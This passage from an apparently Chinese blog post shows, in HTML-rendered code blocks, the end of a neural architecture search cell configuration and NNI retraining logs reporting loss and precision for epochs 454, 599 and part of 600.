class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n3_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n4_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p0&quot;</span>: <span class="string">&quot;avgpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n5_p2&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>retrain日志如下（仅截取第453个epoch和最后两个epoch）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">[2021-02-22 16:16:01] INFO (nni&#x2F;MainThread) Epoch 453 LR 0.003524</span><br><span class="line">[2021-02-22 16:16:02] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 000&#x2F;520 Loss 0.146 Prec@(1,5) (94.8%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 010&#x2F;520 Loss 0.142 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 020&#x2F;520 Loss 0.151 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:10] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 030&#x2F;520 Loss 0.137 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:13] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 040&#x2F;520 Loss 0.147 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 050&#x2F;520 Loss 0.146 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:18] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 060&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:21] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 070&#x2F;520 Loss 0.145 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 080&#x2F;520 Loss 0.144 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 090&#x2F;520 Loss 0.143 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:29] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 100&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 110&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 120&#x2F;520 Loss 0.139 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:37] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 130&#x2F;520 Loss 0.138 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:40] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 140&#x2F;520 Loss 0.140 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 150&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 160&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:48] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 170&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 180&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 190&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:56] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 200&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:59] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 210&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 220&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 230&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 240&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 250&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 260&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 270&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 280&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 290&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 300&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 310&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:28] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 320&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 330&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 340&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:36] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 350&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:39] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 360&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 370&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 380&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:47] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 390&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 400&#x2F;520 Loss 0.143 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 410&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:55] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 420&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:58] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 430&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 440&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 450&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:06] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 460&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 470&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 480&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:14] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 490&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 500&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 510&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 520&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Final Prec@1 97.0640%</span><br><span class="line">...</span><br><span class="line">[2021-02-22 21:37:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 000&#x2F;520 Loss 0.054 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:05] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 010&#x2F;520 Loss 0.060 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 020&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 030&#x2F;520 Loss 0.054 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:12] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 040&#x2F;520 Loss 0.059 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 050&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:17] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 060&#x2F;520 Loss 0.064 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 080&#x2F;520 Loss 0.068 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:24] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 100&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:29] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 110&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 120&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 130&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:41] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:46] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:53] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 220&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:58] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 230&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 240&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 250&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 260&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 270&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 280&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:13] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:18] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 310&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:25] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 340&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:30] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 390&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 400&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:42] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 420&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:47] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:54] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 460&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 470&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:59] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 480&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 500&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 520&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Final Prec@1 98.7600%</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 000&#x2F;104 Loss 0.146 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 010&#x2F;104 Loss 0.113 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 020&#x2F;104 Loss 0.135 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 030&#x2F;104 Loss 0.163 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 040&#x2F;104 Loss 0.159 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 050&#x2F;104 Loss 0.155 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 060&#x2F;104 Loss 0.150 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 104&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Final Prec@1 97.2400%</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Epoch 599 LR 0.000001</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 000&#x2F;520 Loss 0.039 Prec@(1,5) (100.0%, 100.0%)</span><br><span 